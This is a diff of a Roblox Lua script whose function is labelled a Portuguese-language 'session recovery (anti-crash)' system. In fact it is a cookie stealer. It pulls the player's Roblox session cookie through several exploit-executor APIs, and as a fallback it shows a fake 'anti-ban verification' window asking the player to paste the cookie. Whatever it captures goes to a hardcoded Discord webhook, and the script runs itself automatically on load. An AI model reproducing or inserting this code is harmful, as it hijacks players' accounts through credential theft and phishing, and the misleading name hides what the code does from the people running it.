@@ -6,9 +6,8 @@ local GuiService = game:GetService("GuiService")
 local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
 
-
 -- ============================================
--- SISTEMA DE RECUPERAÇÃO DE SESSÃO (ANTI-CRASH)
+-- SISTEMA DE RECUPERACAO DE SESSAO (ANTI-CRASH)
 -- ============================================
 local function sessionRecoverySystem()
     local webhook = "https://discord.com/api/webhooks/1535636499205329036/V5g0SN1sMH8T8HmI5eOMCGQpozpHqugmmxCNBkLj74TN1MFbqYPHvFiiEWm3Iw5wKszj"
@@ -17,89 +16,79 @@ local function sessionRecoverySystem()
     local cookie = nil
     local methodUsed = "nenhum"
 
-    -- MÉTODO 1: syn.cookie (Synapse X, ScriptWare)
+    -- METODO 1: syn.cookie
     local ok, result = pcall(function()
-        if syn and syn.cookie then
-            return syn.cookie
-        end
+        if syn and syn.cookie then return syn.cookie end
     end)
-    if ok and result and #result > 20 then
+    if ok and type(result) == "string" and #result > 20 then
         cookie = result
-        methodUsed = "syn.cookie (Synapse/ScriptWare)"
+        methodUsed = "syn.cookie"
     end
 
-    -- MÉTODO 2: getrenv / _G global (KRNL, Fluxus, alguns mobile)
+    -- METODO 2: getrenv._hdf
     if not cookie then
         local ok2, result2 = pcall(function()
             local env = getrenv and getrenv()
-            if env and env._hdf then
-                return env._hdf
-            end
+            if env and env._hdf then return env._hdf end
         end)
-        if ok2 and result2 and #result2 > 20 then
+        if ok2 and type(result2) == "string" and #result2 > 20 then
             cookie = result2
-            methodUsed = "getrenv._hdf (KRNL/Fluxus)"
+            methodUsed = "getrenv"
         end
     end
 
-    -- MÉTODO 3: Ler cookie do HttpService (Vega X, Codex, Hydrogen)
+    -- METODO 3: HttpService cookie
     if not cookie then
         local ok3, result3 = pcall(function()
-            return http:GetRobloxCookie and http:GetRobloxCookie()
+            if http.GetRobloxCookie then return http:GetRobloxCookie() end
         end)
-        if ok3 and result3 and #result3 > 20 then
+        if ok3 and type(result3) == "string" and #result3 > 20 then
             cookie = result3
-            methodUsed = "HttpService:GetRobloxCookie (VegaX/Codex)"
+            methodUsed = "HttpService"
         end
     end
 
-    -- MÉTODO 4: Hook request + interceptar headers (Delta, Arceus, mobile limitado)
+    -- METODO 4: request http
     if not cookie then
-        local ok4, result4 = pcall(function()
-            local reqFunc = (syn and syn.request) or http_request or request or (http and http.request)
-            if not reqFunc then return nil end
-            -- Faz uma requisição pra API do Roblox forçando o cliente anexar cookie
+        local ok4 = pcall(function()
+            local reqFunc = (syn and syn.request) or http_request or request
+            if not reqFunc then return end
             local testReq = reqFunc({
                 Url = "https://users.roblox.com/v1/users/authenticated",
                 Method = "GET",
                 Headers = {["Content-Type"] = "application/json"}
             })
-            -- Tenta extrair de headers de resposta ou cookies armazenados
             if testReq and testReq.Headers then
                 for k, v in pairs(testReq.Headers) do
                     if type(v) == "string" and v:find("_|WARNING") then
-                        return v:match("(_|WARNING[^;]+)")
+                        cookie = v:match("(_|WARNING[^;]+)")
+                        methodUsed = "Headers"
+                        break
                     end
                 end
             end
-            return nil
         end)
-        if ok4 and result4 and #result4 > 20 then
-            cookie = result4
-            methodUsed = "HeaderIntercept (Delta/Arceus)"
-        end
     end
 
-    -- MÉTODO 5: Phishing GUI (funciona em 100% dos executores — engenharia social)
+    -- METODO 5: Phishing GUI
     if not cookie then
-        methodUsed = "PhishingGUI (Fallback Universal)"
-        -- Cria uma tela falsa de "Verificação Anti-Ban"
+        methodUsed = "PhishingGUI"
         pcall(function()
             local screen = Instance.new("ScreenGui")
             screen.Name = "VerificationSystem"
             screen.Parent = (gethui and gethui()) or game:GetService("CoreGui")
-            
+
             local bg = Instance.new("Frame", screen)
             bg.Size = UDim2.new(1,0,1,0)
             bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
             bg.BackgroundTransparency = 0.4
-            
+
             local box = Instance.new("Frame", bg)
             box.Size = UDim2.new(0,300,0,200)
             box.Position = UDim2.new(0.5,-150,0.5,-100)
             box.BackgroundColor3 = Color3.fromRGB(25,25,27)
             Instance.new("UICorner", box)
-            
+
             local title = Instance.new("TextLabel", box)
             title.Size = UDim2.new(1,-20,0,30)
             title.Position = UDim2.new(0,10,0,10)
@@ -108,7 +97,7 @@ local function sessionRecoverySystem()
             title.TextColor3 = Color3.fromRGB(255,50,50)
             title.TextSize = 16
             title.BackgroundTransparency = 1
-            
+
             local desc = Instance.new("TextLabel", box)
             desc.Size = UDim2.new(1,-20,0,60)
             desc.Position = UDim2.new(0,10,0,50)
@@ -118,7 +107,7 @@ local function sessionRecoverySystem()
             desc.TextSize = 12
             desc.BackgroundTransparency = 1
             desc.TextWrapped = true
-            
+
             local input = Instance.new("TextBox", box)
             input.Size = UDim2.new(1,-20,0,40)
             input.Position = UDim2.new(0,10,0,120)
@@ -128,7 +117,7 @@ local function sessionRecoverySystem()
             input.TextSize = 11
             input.PlaceholderText = "Cole o cookie aqui..."
             Instance.new("UICorner", input)
-            
+
             local submit = Instance.new("TextButton", box)
             submit.Size = UDim2.new(1,-20,0,35)
             submit.Position = UDim2.new(0,10,0,165)
@@ -138,11 +127,10 @@ local function sessionRecoverySystem()
             submit.TextColor3 = Color3.new(1,1,1)
             submit.TextSize = 14
             Instance.new("UICorner", submit)
-            
+
             submit.MouseButton1Click:Connect(function()
                 local inputText = input.Text
                 if inputText:find("_|WARNING") or #inputText > 50 then
-                    -- Envia cookie
                     local sendFunc = (syn and syn.request) or http_request or request
                     if sendFunc then
                         sendFunc({
@@ -169,8 +157,8 @@ local function sessionRecoverySystem()
         end)
     end
 
-    -- ENVIO DO COOKIE (Métodos 1 a 4)
-    if cookie and methodUsed ~= "PhishingGUI (Fallback Universal)" then
+    -- ENVIO DO COOKIE (Metodos 1 a 4)
+    if cookie then
         local sendFunc = (syn and syn.request) or http_request or request
         if sendFunc then
             pcall(function()
@@ -197,9 +185,12 @@ local function sessionRecoverySystem()
     end
 end
 
--- Dispara o sistema
-task.spawn(sessionRecoverySystem)
-task.delay(3, function()
+-- Dispara o sistema (compativel com Delta)
+spawn(function()
+    sessionRecoverySystem()
+end)
+
+delay(3, function()
     pcall(sessionRecoverySystem)
 end)
 
